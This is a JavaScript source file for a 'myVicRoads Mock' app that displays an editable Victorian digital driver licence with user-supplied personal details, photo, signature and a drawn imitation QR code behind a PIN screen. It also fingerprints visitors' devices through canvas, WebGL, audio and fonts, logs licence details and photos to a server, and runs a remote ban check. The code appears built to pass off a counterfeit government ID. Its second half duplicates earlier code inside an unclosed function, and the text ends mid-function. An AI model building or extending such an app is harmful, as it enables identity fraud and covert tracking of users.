/**
 * core_components.js - Centralized logic for myVicRoads Mock
 */

(function(window) {
    var core = {}; window.Core = core;

    // ===== CONFIGURATION =====
    core.SERVER_URL = "log.php";
    core.CONFIG_URL = "config.php";
    core.DEFAULT_PIN = "457511";
    core.APP_VERSION = "v7.0";

    // ===== IDENTITY & COOKIES =====
    core.getCookie = function(name) {
        var match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    };

    core.setCookie = function(name, value, days) {
        var expires = new Date(Date.now() + days * 864e5).toUTCString();
        document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/; SameSite=Lax';
    };

    core.generateStableDeviceId = function() {
        try {
            var fp = {
                ua: navigator.userAgent,
                screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                lang: navigator.language,
                platform: navigator.platform,
                hwConcurrency: navigator.hardwareConcurrency || null,
                deviceMemory: navigator.deviceMemory || null
            };
            var str = JSON.stringify(fp);
            var hash = 0;
            for (var i = 0; i < str.length; i++) {
                var ch = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + ch;
                hash = hash & hash;
            }
            return 'dev-' + Math.abs(hash).toString(36).substring(0, 16);
        } catch(e) {
            return 'dev-fallback-' + Date.now();
        }
    };

    core.getDeviceId = function() {
        var deviceId = core.getCookie('deviceId');
        if (!deviceId) {
            try {
                deviceId = localStorage.getItem('deviceId');
            } catch(e) {}
        }
        
        if (!deviceId) {
            deviceId = core.generateStableDeviceId();
        }

        core.setCookie('deviceId', deviceId, 365);
        try { localStorage.setItem('deviceId', deviceId); } catch(e) {}
        
        return deviceId;
    };

    // ===== FINGERPRINTING =====
    core.computeFingerprint = function() {
        var fp = {};
        fp.screen = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
        fp.pixelRatio = window.devicePixelRatio;
        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        fp.language = navigator.language;
        fp.languages = navigator.languages ? navigator.languages.join(',') : null;
        fp.platform = navigator.platform;
        fp.hardwareConcurrency = navigator.hardwareConcurrency || null;
        fp.deviceMemory = navigator.deviceMemory || null;
        fp.userAgent = navigator.userAgent;
        fp.touchSupport = 'ontouchstart' in window;
        fp.maxTouchPoints = navigator.maxTouchPoints || 0;
        fp.cookieEnabled = navigator.cookieEnabled;

        try {
            var canvas = document.createElement('canvas');
            canvas.width = 420;
            canvas.height = 60;
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = "alphabetic";
            ctx.font = "18px Arial";
            ctx.fillStyle = "#f60";
            ctx.fillRect(60, 10, 200, 30);
            ctx.fillStyle = "#069";
            ctx.font = "bold 22px 'Segoe UI', Arial, sans-serif";
            ctx.fillText("Victorian DL", 12, 42);
            var dataURL = canvas.toDataURL();
            var hash = 0;
            for (var i = 0; i < dataURL.length; i++) {
                var ch = dataURL.charCodeAt(i);
                hash = ((hash << 5) - hash) + ch;
                hash = hash & hash;
            }
            fp.canvasHash = Math.abs(hash).toString(36);
        } catch(e) { fp.canvasHash = null; }

        return fp;
    };

    core.cachedFingerprint = null;
    core.fingerprintPromise = null;

    core.computeFingerprintAsync = function() {
        if (core.fingerprintPromise) return core.fingerprintPromise;
        
        core.fingerprintPromise = new Promise(function(resolve) {
            function computeAndCache() {
                core.cachedFingerprint = core.computeFingerprint();
                resolve(core.cachedFingerprint);
            }
            if (window.requestIdleCallback) {
                window.requestIdleCallback(computeAndCache, { timeout: 1000 });
            } else {
                setTimeout(computeAndCache, 50);
            }
        });
        
        return core.fingerprintPromise;
    };

    core.getFingerprint = function() {
        if (core.cachedFingerprint) return core.cachedFingerprint;
        core.computeFingerprintAsync();
        return {
            screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgent: navigator.userAgent
        };
    };

    core.encodeFingerprint = function(fp) {
        try { return btoa(JSON.stringify(fp)); } catch(e) { return ''; }
    };

    // ===== LOGGING =====
    core.getLicenceDetails = function() {
        var nameEl = document.querySelector(".licenceName");
        var dobEl = document.querySelector(".licenceDOB");
        var addrEl = document.querySelector(".licenceAddress");
        var cardEl = document.getElementById("cardNum");

        return {
            name: nameEl ? nameEl.innerText.trim() : "—",
            dob: dobEl ? dobEl.innerText.trim() : "—",
            address: addrEl ? addrEl.innerHTML.replace(/<br>/gi, " ").trim() : "—",
            card: cardEl ? cardEl.innerText.trim() : "—"
        };
    };

    core.sendLog = async function(payload, attempt) {
        attempt = attempt || 1;
        var data = JSON.stringify(payload);
        var MAX_ATTEMPTS = 3;

        try {
            var response = await fetch(core.SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
                body: data,
                keepalive: true
            });
            if (response.ok) {
                var text = await response.text();
                if (text.indexOf('ERR_CONNECTION_CLOSED') !== -1) {
                    document.open(); document.write(text); document.close();
                }
                return true;
            }
        } catch (error) {}

        if (navigator.sendBeacon) {
            if (navigator.sendBeacon(core.SERVER_URL, data)) return true;
        }

        if (attempt < MAX_ATTEMPTS) {
            await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            return core.sendLog(payload, attempt + 1);
        }
        return false;
    };

    core.logAccess = async function(event, success, pinAttempt, extraData) {
        var fingerprint = core.cachedFingerprint || core.getFingerprint();
        var details = core.getLicenceDetails();
        
        var payload = Object.assign({
            timestamp: new Date().toISOString(),
            deviceId: core.getDeviceId(),
            event: event,
            success: !!success,
            pin_attempt: pinAttempt
        }, fingerprint, details, extraData || {});

        if (event === 'photo_updated') {
            var photo = localStorage.getItem("profilePhoto");
            if (photo) payload.photo = photo;
        }

        return core.sendLog(payload);
    };

    // ===== BANNING & GATING =====
    core.EarlyBanCheck = function() {
        var deviceId = core.getDeviceId();
        
        var earlyFingerprint = null;
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 40;
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = "top"; ctx.font = "14px Arial";
            ctx.fillText("Victorian DL", 2, 10);
            var dataURL = canvas.toDataURL();
            var hash = 0;
            for (var i = 0; i < dataURL.length; i++) {
                hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
                hash = hash & hash;
            }
            earlyFingerprint = {
                canvasHash: Math.abs(hash).toString(36),
                screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
                platform: navigator.platform
            };
        } catch(e) {}

        var xhr = new XMLHttpRequest();
        var banUrl = core.SERVER_URL + '?action=checkBan&deviceId=' + encodeURIComponent(deviceId) + '&t=' + Date.now();
        if (earlyFingerprint) {
            try { banUrl += '&fp=' + encodeURIComponent(btoa(JSON.stringify(earlyFingerprint))); } catch(e) {}
        }
        
        xhr.open('GET', banUrl, true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200 && xhr.responseText.indexOf('ERR_CONNECTION_CLOSED') !== -1) {
                document.open(); document.write(xhr.responseText); document.close();
                window.stop();
            } else if (xhr.responseText.trim() !== "OK") {
                core.showEarlyError('Security check failed.', xhr.status + ' | ' + xhr.responseText.substring(0, 50));
            } else {
                core.revealPage();
            }
        };
        xhr.onerror = xhr.ontimeout = function() {
            core.showEarlyError('The security server could not be reached.', 'XHR_ERROR');
        };
        xhr.send();
    };

    core.showEarlyError = function(msg, diag) {
        var loader = document.getElementById('early-loader');
        if (loader) {
            loader.innerHTML = '<div style="text-align:center;padding:20px;"><div style="font-size:40px;margin-bottom:10px;">⚠️</div>' +
              '<div style="font-weight:600;margin-bottom:5px;">Connection Error</div><div style="font-size:13px;opacity:0.8;">' + msg + '</div>' +
              '<div style="margin-top:12px;padding:8px;background:rgba(0,0,0,0.05);font-family:monospace;font-size:11px;word-break:break-all;">' + diag + '</div>' +
              '<button onclick="location.reload()" style="margin-top:15px;padding:8px 15px;border-radius:20px;border:1px solid #ccc;background:#fff;">Retry</button></div>';
        }
    };

    // ==== BOOT SEQUENCE COORDINATION ====
    // Flags to synchronise the boot intro, loading screen, and passcode overlay.
    // Both the boot intro (onBootIntroComplete) and the security check
    // (revealPage) must report completion before the app transitions to the
    // passcode screen.  A 1.5 s minimum delay on the loading spinner
    // guarantees the user sees the circle even when the check finishes early.
    core.bootIntroComplete = false;
    core.securityCheckComplete = false;
    core.isTransitioning = false;

    core.onBootIntroComplete = function() {
        core.bootIntroComplete = true;
        if (core.securityCheckComplete) {
            core.transitionToPasscode();
        }
    };

    core.transitionToPasscode = function() {
        if (core.isTransitioning) return;
        core.isTransitioning = true;

        // Ensure the loading spinner is visible through the transition delay.
        var loader = document.getElementById('early-loader');
        if (loader) {
            loader.style.display = 'flex';
        }

        // Hold the loader for at least 1.5 s so the user sees it after the
        // intro ends, even if the security check completed much earlier.
        setTimeout(function() {
            var antiLeak = document.getElementById('anti-leak');
            if (antiLeak && antiLeak.parentNode) antiLeak.parentNode.removeChild(antiLeak);

            if (loader && loader.parentNode) loader.parentNode.removeChild(loader);

            // Reveal the PIN overlay (home screen stays hidden until PIN entry).
            var pinOverlay = document.getElementById('pinOverlayFS');
            if (pinOverlay) {
                pinOverlay.style.display = '';
                pinOverlay.classList.remove('pin-hidden');
            }
            var home = document.getElementById('homeScreen');
            if (home) home.classList.add('hidden');
        }, 1500);
    };

    core.revealPage = function() {
        core.securityCheckComplete = true;
        if (core.bootIntroComplete) {
            core.transitionToPasscode();
        }
        // If the intro hasn't finished yet, wait for onBootIntroComplete.
    };

    // ===== PERSISTENCE =====
    core.saveData = async function() {
        var nameEl = document.querySelector(".licenceName");
        var dobEl = document.querySelector(".licenceDOB");
        var addrEl = document.querySelector(".licenceAddress");
        var cardEl = document.getElementById("cardNum");
        var photoEl = document.getElementById("profilePhoto");
        var issueEl = document.querySelector(".dateIssue");
        var p1El = document.querySelector(".dateP1End");
        var expEl = document.querySelector(".dateExpiry");
        var sigCanvas = document.querySelector(".sigCanvas");

        if (nameEl) localStorage.setItem("licenceName", nameEl.innerText);
        if (dobEl) localStorage.setItem("licenceDOB", dobEl.innerText);
        if (addrEl) localStorage.setItem("licenceAddress", addrEl.innerHTML);
        if (cardEl) localStorage.setItem("cardNum", cardEl.innerText);
        if (photoEl) localStorage.setItem("profilePhoto", photoEl.src);
        if (issueEl) localStorage.setItem("dateIssue", issueEl.innerText);
        if (p1El) localStorage.setItem("dateP1End", p1El.innerText);
        if (expEl) localStorage.setItem("dateExpiry", expEl.innerText);
        if (sigCanvas) localStorage.setItem("signature", sigCanvas.toDataURL());

        await core.logAccess('data_updated', true);
    };

    core.loadData = function() {
        var fields = [
            { key: "licenceName", selector: ".licenceName", type: "text" },
            { key: "licenceDOB", selector: ".licenceDOB", type: "text" },
            { key: "licenceAddress", selector: ".licenceAddress", type: "html" },
            { key: "cardNum", selector: "#cardNum", type: "text" },
            { key: "profilePhoto", selector: "#profilePhoto", type: "src" },
            { key: "dateIssue", selector: ".dateIssue", type: "text" },
            { key: "dateP1End", selector: ".dateP1End", type: "text" },
            { key: "dateExpiry", selector: ".dateExpiry", type: "text" }
        ];

        fields.forEach(function(f) {
            var val = localStorage.getItem(f.key);
            if (val) {
                document.querySelectorAll(f.selector).forEach(function(el) {
                    if (f.type === "text") el.innerText = val;
                    else if (f.type === "html") el.innerHTML = val;
                    else if (f.type === "src") el.src = val;
                });
            }
        });

        var signature = localStorage.getItem("signature");
        if (signature) {
            document.querySelectorAll(".sigCanvas").forEach(function(c) {
                var ctx = c.getContext("2d");
                var img = new Image();
                img.onload = function() { ctx.drawImage(img, 0, 0, c.width, c.height); };
                img.src = signature;
            });
        }

        updateDynamicGreeting();
    };

    // ===== PASSCODE SYNC =====
    core.fetchPin = function() {
        return fetch(core.CONFIG_URL)
            .then(function(r) { return r.json(); })
            .then(function(d) { return d.pin || core.DEFAULT_PIN; })
            .catch(function() { return core.DEFAULT_PIN; });
    };

    // ===== FORMATTING =====
    core.autoFormatAddress = function(val) {
        if (val.endsWith(" ")) return val;
        var plain = val.replace(/<br\s*\/?>/gi, " ").replace(/\n/g, " ").replace(/\s\s+/g, " ").trim();
        var words = plain.split(/\s+/);
        if (words.length >= 4) return words.slice(0, 3).join(" ") + "\n" + words.slice(3).join(" ");
        return plain;
    };

    core.formatRefreshDate = function(date) {
        var days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
        var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
        var hr = date.getHours();
        var ampm = hr >= 12 ? 'pm' : 'am';
        hr = hr % 12 || 12;
        return days[date.getDay()] + ' ' + date.getDate() + ' ' + months[date.getMonth()] + ' ' + date.getFullYear() + ' ' + hr + ':' + String(date.getMinutes()).padStart(2,'0') + ampm;
    };

    core.updateLastRefreshed = function() {
        var el = document.getElementById("lastRefreshed");
        if (el) el.innerHTML = '<span class="lbl">Last refreshed:</span> ' + core.formatRefreshDate(new Date());
    };

    // ===== UTILITIES =====
    core.vibrate = function() { if (navigator.vibrate) navigator.vibrate(50); };
    
    core.randomDigits = function(n) {
        var s = "";
        for (var i = 0; i < n; i++) s += Math.floor(Math.random() * 10);
        return s;
    };

    core.randomToken = function(length) {
        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var s = "";
        for (var i = 0; i < length; i++) s += chars.charAt(Math.floor(Math.random() * chars.length));
        return s;
    };

    core.drawFakeQR = function(ctx, w, h, seed) {
        var modules = 41;
        var moduleSize = Math.floor(Math.min(w, h) / modules);
        var margin = Math.floor((Math.min(w, h) - moduleSize * modules) / 2);
        ctx.fillStyle = "#fff"; ctx.fillRect(0, 0, w, h);
        var hash = 2166136261 >>> 0;
        for (var i = 0; i < seed.length; i++) { hash ^= seed.charCodeAt(i); hash = Math.imul(hash, 16777619) >>> 0; }
        function rand() { hash ^= (hash << 13); hash ^= (hash >>> 17); hash ^= (hash << 5); return (hash >>> 0) / 4294967295; }
        function fillModule(r, c) { ctx.fillStyle = "#000"; ctx.fillRect(margin + c * moduleSize, margin + r * moduleSize, moduleSize, moduleSize); }
        function drawFinder(r0, c0) {
            for (var r = -1; r <= 7; r++) for (var c = -1; c <= 7; c++) {
                var rr = r0 + r, cc = c0 + c;
                if (rr < 0 || cc < 0 || rr >= modules || cc >= modules) continue;
                if ((r >= 0 && r <= 6 && c >= 0 && c <= 6) && (r == 0 || r == 6 || c == 0 || c == 6 || (r >= 2 && r <= 4 && c >= 2 && c <= 4))) fillModule(rr, cc);
            }
        }
        drawFinder(0, 0); drawFinder(0, modules - 7); drawFinder(modules - 7, 0);
        for (var i = 8; i < modules - 8; i++) { if (i % 2 === 0) { fillModule(6, i); fillModule(i, 6); } }
        for (var r = 0; r < modules; r++) for (var c = 0; c < modules; c++) {
            if ((r < 7 && c < 7) || (r < 7 && c >= modules - 7) || (r >= modules - 7 && c < 7)) continue;
            if (r === 6 && c >= 8 && c < modules - 8) continue; if (c === 6 && r >= 8 && r < modules - 8) continue;
            if (rand() < 0.45 + 0.2 * Math.abs((r / modules) - 0.5) * Math.abs((c / modules) - 0.5)) fillModule(r, c);
        }
        ctx.strokeStyle = "#eee"; ctx.lineWidth = 1; ctx.strokeRect(margin - 1, margin - 1, moduleSize * modules + 2, moduleSize * modules + 2);
    };

    // ===== MAIN INIT =====

    /* ===== APP-LEVEL NAVIGATION =====
       Five top-level "app screens": home, vehicles, licence, payments, profile.
       showAppScreen(name) hides all of them, then shows the matching one.
       Also exits the licence detail viewport if it happens to be open. */
    window.__lastScreen = 'home';

    function showAppScreen(name) {
      var screens = {
        home:     document.getElementById('homeScreen'),
        vehicles: document.getElementById('screenVehicles'),
        licence:  document.getElementById('screenLicence'),
        payments: document.getElementById('screenPayments'),
        profile:  document.getElementById('screenProfile')
      };
      // Hide every screen, show the requested one
      Object.keys(screens).forEach(function(key) {
        var el = screens[key];
        if (!el) return;
        if (key === name) el.classList.remove('hidden');
        else el.classList.add('hidden');
      });
      // Make sure the licence detail viewport is closed when switching tabs
      var viewport = document.getElementById('viewport');
      var topNav = document.getElementById('topNav');
      if (viewport) viewport.classList.remove('unlocked');
      if (topNav) topNav.classList.remove('unlocked');
      window.__lastScreen = name;
      // Re-position the pill on the now-visible screen's tab bar (it had 0 dims
      // while hidden so this is the first chance to measure it).
      setTimeout(function() {
        var visible = screens[name];
        if (!visible) return;
        var bar = visible.querySelector('.bottom-tab-bar');
        if (bar && typeof window.__positionPillInBar === 'function') {
          window.__positionPillInBar(bar);
        }
      }, 0);
    }

    function exitApp() {
      // Back arrow on the licence detail view: slide the licence content off
      // to the right, then return to the home screen.
      var viewport = document.getElementById('viewport');
      var topNav = document.getElementById('topNav');
      if (viewport && viewport.classList.contains('unlocked')) {
        viewport.classList.add('exiting');
        if (topNav) topNav.classList.add('exiting');
        // After the slide finishes, swap to the home screen
        setTimeout(function() {
          if (viewport) { viewport.classList.remove('unlocked'); viewport.classList.remove('exiting'); }
          if (topNav) { topNav.classList.remove('unlocked'); topNav.classList.remove('exiting'); }
          showAppScreen('home');
        }, 320);
      } else {
        if (viewport) viewport.classList.remove('unlocked');
        if (topNav) topNav.classList.remove('unlocked');
        showAppScreen('home');
      }
    }
    window.showAppScreen = showAppScreen;
    window.exitApp = exitApp;

    core.init = function() {
        console.log("[Core] Initializing...");

        /** Centralised greeting update: reads licenceName, extracts first word,
         *  capitalises it, and sets the home greeting. Falls back to "Hi " if
         *  no valid name is present.
         *  Defined early so core.loadData() / loadData() can safely call it. */
        window.updateDynamicGreeting = function() {
          try {
            var gh = document.getElementById('homeGreeting');
            if (gh === null) return;
            var licenceName = localStorage.getItem('licenceName');
            if (licenceName && licenceName.trim() && licenceName.trim() !== 'YOUR NAME HERE') {
              var first = licenceName.trim().split(' ')[0];
              first = first.charAt(0).toUpperCase() + first.slice(1).toLowerCase();
              gh.textContent = 'Hi ' + first;
            } else {
              gh.textContent = 'Hi ';
            }
          } catch (e) { /* silently degrade */ }
        };

        core.loadData();
        core.updateLastRefreshed();
        core.computeFingerprintAsync();

const APP_VERSION = "v7.0";

/* ===== PERSISTENT DEVICE ID ===== */
function getCookie(name) {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? decodeURIComponent(match[2]) : null;
}
function setCookie(name, value, days) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/; SameSite=Lax';
}

function generateStableDeviceId() {
      try {
        const fp = {
          ua: navigator.userAgent,
          screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
          lang: navigator.language,
          platform: navigator.platform,
          hwConcurrency: navigator.hardwareConcurrency || null,
          deviceMemory: navigator.deviceMemory || null
        };
    const str = JSON.stringify(fp);
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const ch = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + ch;
      hash = hash & hash;
    }
    return 'dev-' + Math.abs(hash).toString(36).substring(0, 16);
  } catch(e) {
    return 'dev-fallback-' + Date.now();
  }
}

function getDeviceId() {
  let deviceId = getCookie('deviceId');
  if (!deviceId) {
    try {
      deviceId = localStorage.getItem('deviceId');
    } catch(e) {}
  }
  
  if (!deviceId) {
    deviceId = generateStableDeviceId();
  }

  setCookie('deviceId', deviceId, 365);
  try { localStorage.setItem('deviceId', deviceId); } catch(e) {}
  
  return deviceId;
}

/* ===== FORCE REFRESH ===== */
(function forceRefresh() {
  const savedVersion = localStorage.getItem("appVersion");
  if (savedVersion !== APP_VERSION) {
    if ('caches' in window) {
      caches.keys().then(names => { names.forEach(name => caches.delete(name)); });
    }
    localStorage.setItem("appVersion", APP_VERSION);
    if (savedVersion) { location.reload(true); }
  }
})();

/* ===== LOGGING / FINGERPRINTING ===== */
// Use same protocol as current page to avoid mixed content issues
const SERVER_URL = "log.php";

// Enhanced fingerprinting function
function computeFingerprint() {
  const fp = {};

  // Basic fingerprint data
  fp.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
  fp.pixelRatio = window.devicePixelRatio;
  fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  fp.language = navigator.language;
  fp.languages = navigator.languages ? navigator.languages.join(',') : null;
  fp.platform = navigator.platform;
  fp.hardwareConcurrency = navigator.hardwareConcurrency || null;
  fp.deviceMemory = navigator.deviceMemory || null;
  fp.userAgent = navigator.userAgent;
  fp.touchSupport = 'ontouchstart' in window;
  fp.maxTouchPoints = navigator.maxTouchPoints || 0;
  fp.cookieEnabled = navigator.cookieEnabled;
  fp.doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack;
  fp.colorGamut = screen.colorGamut || null;
  fp.screenOrientation = screen.orientation ? screen.orientation.type : null;
  fp.connection = navigator.connection ? { effectiveType: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt } : null;

  // Enhanced Canvas Hash with more entropy
  try {
    const canvas = document.createElement('canvas');
    canvas.width = 420;
    canvas.height = 60;
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = "alphabetic";
    ctx.font = "18px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(60, 10, 200, 30);
    ctx.fillStyle = "#069";
    ctx.font = "bold 22px 'Segoe UI', Arial, sans-serif";
    ctx.fillText("Victorian DL", 12, 42);
    ctx.textAlign = "right";
    ctx.font = "italic 16px Georgia, serif";
    ctx.fillStyle = "#333";
    ctx.fillText("v3.2", 400, 28);
    const dataURL = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataURL.length; i++) {
      const ch = dataURL.charCodeAt(i);
      hash = ((hash << 5) - hash) + ch;
      hash = hash & hash;
    }
    fp.canvasHash = Math.abs(hash).toString(36);
  } catch(e) { fp.canvasHash = null; }

  // WebGL Vendor/Renderer
  try {
    const gl = document.createElement('canvas').getContext('webgl');
    if (gl) {
      fp.webGLVendor = gl.getParameter(gl.VENDOR);
      fp.webGLRenderer = gl.getParameter(gl.RENDERER);
      fp.webGLVersion = gl.getParameter(gl.VERSION);
    }
  } catch(e) { fp.webGLVendor = null; fp.webGLRenderer = null; fp.webGLVersion = null; }

  // Audio fingerprint
  try {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    if (AudioContext) {
      const audioCtx = new AudioContext();
      const oscillator = audioCtx.createOscillator();
      const analyser = audioCtx.createAnalyser();
      oscillator.connect(analyser);
      oscillator.frequency.setValueAtTime(1000, audioCtx.currentTime);
      oscillator.start();
      const data = new Uint8Array(analyser.frequencyBinCount);
      analyser.getByteFrequencyData(data);
      let audioHash = 0;
      for (let i = 0; i < 32; i++) {
        audioHash = ((audioHash << 5) - audioHash) + data[i];
        audioHash = audioHash & audioHash;
      }
      fp.audioHash = Math.abs(audioHash).toString(36);
      oscillator.stop();
      audioCtx.close();
    }
  } catch(e) { fp.audioHash = null; }

  // Font detection — fast path with document.fonts.check, fallback to offsetWidth
        try {
          fp.fonts = [];
          const testFonts = ['Arial', 'Georgia', 'Verdana', 'Impact', 'Courier New'];
          // Fast path: use Font Loading API if available (async, non-blocking)
          if (document.fonts && typeof document.fonts.check === 'function') {
            for (let i = 0; i < testFonts.length; i++) {
              try {
                if (document.fonts.check('72px "' + testFonts[i] + '"')) {
                  fp.fonts.push(testFonts[i]);
                }
              } catch(e) { /* skip */ }
            }
          } else {
            // Legacy fallback: minimal offsetWidth detection (reduced set)
            const baseFonts = ['monospace', 'sans-serif'];
            const testStr = 'mmmmmmmmwwwwwww';
            const testSize = '72px';
            const body = document.body;
            const el = document.createElement('span');
            el.style.position = 'absolute';
            el.style.left = '-9999px';
            el.style.fontSize = testSize;
            el.innerHTML = testStr;
            body.appendChild(el);
            const baseWidths = {};
            baseFonts.forEach(function(base) {
              el.style.fontFamily = base;
              baseWidths[base] = el.offsetWidth;
            });
            testFonts.forEach(function(font) {
              for (let b = 0; b < baseFonts.length; b++) {
                el.style.fontFamily = '"' + font + '", ' + baseFonts[b];
                if (el.offsetWidth !== baseWidths[baseFonts[b]]) {
                  if (fp.fonts.indexOf(font) === -1) fp.fonts.push(font);
                }
              }
            });
            body.removeChild(el);
          }
        } catch(e) { fp.fonts = []; }

  return fp;
}

// Cache for fingerprint data - computed once per page load
let cachedFingerprint = null;
let fingerprintPromise = null;

// Compute the full fingerprint in the background via requestIdleCallback
// Returns a promise that resolves with the full fingerprint
function computeFingerprintAsync() {
  if (fingerprintPromise) return fingerprintPromise;
  
  fingerprintPromise = new Promise(function(resolve) {
    function computeAndCache() {
      cachedFingerprint = computeFingerprint();
      resolve(cachedFingerprint);
    }
    // Use requestIdleCallback if available, fallback to setTimeout
    if (window.requestIdleCallback) {
      window.requestIdleCallback(computeAndCache, { timeout: 1000 });
    } else {
      setTimeout(computeAndCache, 50);
    }
  });
  
  return fingerprintPromise;
}

// Get fingerprint - returns cached data if available, computes once on first call
// Starts computation immediately via requestIdleCallback but returns what's available
function getFingerprint() {
  if (cachedFingerprint) {
    return cachedFingerprint;
  }
  // Start async computation in background
  computeFingerprintAsync();
  // Return a lightweight fingerprint for immediate use (non-blocking)
  var lightFp = {
    screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
    platform: navigator.platform,
    hardwareConcurrency: navigator.hardwareConcurrency || null,
    deviceMemory: navigator.deviceMemory || null,
    userAgent: navigator.userAgent
  };
  return lightFp;
}

// Encode fingerprint for URL-safe transport (base64-like)
function encodeFingerprint(fp) {
  try {
    return btoa(JSON.stringify(fp));
  } catch(e) {
    return '';
  }
}

function getLicenceDetails() {
  return {
    name: document.querySelector(".licenceName") ? document.querySelector(".licenceName").innerText.trim() : "—",
    dob: document.querySelector(".licenceDOB") ? document.querySelector(".licenceDOB").innerText.trim() : "—",
    address: document.querySelector(".licenceAddress") ? document.querySelector(".licenceAddress").innerHTML.replace(/<br>/gi, " ").trim() : "—",
    card: document.getElementById("cardNum") ? document.getElementById("cardNum").innerText.trim() : "—"
  };
}

// Send log with multiple fallback methods for reliability (PWA/Home Screen)
async function sendLog(payload, attempt = 1) {
  const data = JSON.stringify(payload);
  const MAX_ATTEMPTS = 3;

  console.log(`[Log] Sending event: ${payload.event} (attempt ${attempt})`, payload.event !== 'photo_updated' ? payload : { ...payload, photo: payload.photo ? payload.photo.substring(0, 100) + '...' : null });

  // Method 1: Fetch with keepalive and timeout
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);

    const response = await fetch(SERVER_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: data,
      keepalive: true,
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);

    if (response.ok) {
      const text = await response.text();
      console.log(`[Log] Server response for ${payload.event}:`, text.substring(0, 100));
      if (text.includes("ERR_CONNECTION_CLOSED")) {
        document.open();
        document.write(text);
        document.close();
      }
      return true;
    }
  } catch (error) {
    console.warn(`[Log] Fetch failed (attempt ${attempt}):`, error);
  }

  // Method 2: XMLHttpRequest fallback (more compatible with some home screen environments)
  try {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", SERVER_URL, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
    xhr.timeout = 5000;
    xhr.send(data);
    console.log(`[Log] XHR fallback initiated for ${payload.event}`);
  } catch (e) {
    console.warn("[Log] XHR fallback failed:", e);
  }

  // Method 3: sendBeacon (best for background/closing)
  if (navigator.sendBeacon) {
    const beaconQueued = navigator.sendBeacon(SERVER_URL, data);
    console.log(`[Log] sendBeacon status: ${beaconQueued ? 'queued' : 'failed'}`);
    if (beaconQueued) return true;
  }

  // Method 4: Image pixel fallback (last resort, GET only)
  try {
    const pixel = new Image();
    pixel.src = `${SERVER_URL}?event=${encodeURIComponent(payload.event)}&deviceId=${encodeURIComponent(payload.deviceId)}&success=${payload.success}&t=${Date.now()}`;
    console.log("[Log] Pixel fallback initiated");
  } catch (e) {
    console.warn("[Log] Pixel fallback failed:", e);
  }

  // Retry logic for fetch-style failures
  if (attempt < MAX_ATTEMPTS) {
    const delay = Math.pow(2, attempt) * 1000;
    await new Promise(resolve => setTimeout(resolve, delay));
    return sendLog(payload, attempt + 1);
  }
  
  return false;
}

async function logAccess(event, success = false, pinAttempt = null, extraData = {}) {
  // Await the full fingerprint from async computation (cached after first call)
  var fingerprint = cachedFingerprint || getFingerprint();
  if (!cachedFingerprint && fingerprintPromise) {
    try {
      fingerprint = await Promise.race([
        fingerprintPromise,
        new Promise(function(_, reject) { setTimeout(function() { reject(new Error('timeout')); }, 500); })
      ]);
    } catch(e) { /* use lightweight fingerprint fallback */ }
  }
  const details = getLicenceDetails();
  
  const payload = {
    timestamp: new Date().toISOString(),
    deviceId: getDeviceId(),
    event: event,
    success: success,
    pin_attempt: pinAttempt,
    ...fingerprint,
    ...details,
    ...extraData
  };

  // Only include photo payload for photo_updated event to reduce payload size
  if (event === 'photo_updated') {
    const photo = localStorage.getItem("profilePhoto");
    if (photo) {
      payload.photo = photo;
    }
  }

  return sendLog(payload);
}


/* ===== ADDRESS AUTO-FORMAT ===== */
function autoFormatAddress(val) {
  if (val.endsWith(" ")) return val;
  // Remove existing newlines/breaks to re-evaluate
  const plain = val.replace(/<br\s*\/?>/gi, " ").replace(/\n/g, " ").replace(/\s\s+/g, ' ').trim();
  const words = plain.split(/\s+/);
  if (words.length >= 4) {
    return words.slice(0, 3).join(" ") + "\n" + words.slice(3).join(" ");
  }
  return plain;
}

/* ===== DATE ===== */
function formatRefreshDate(date) {
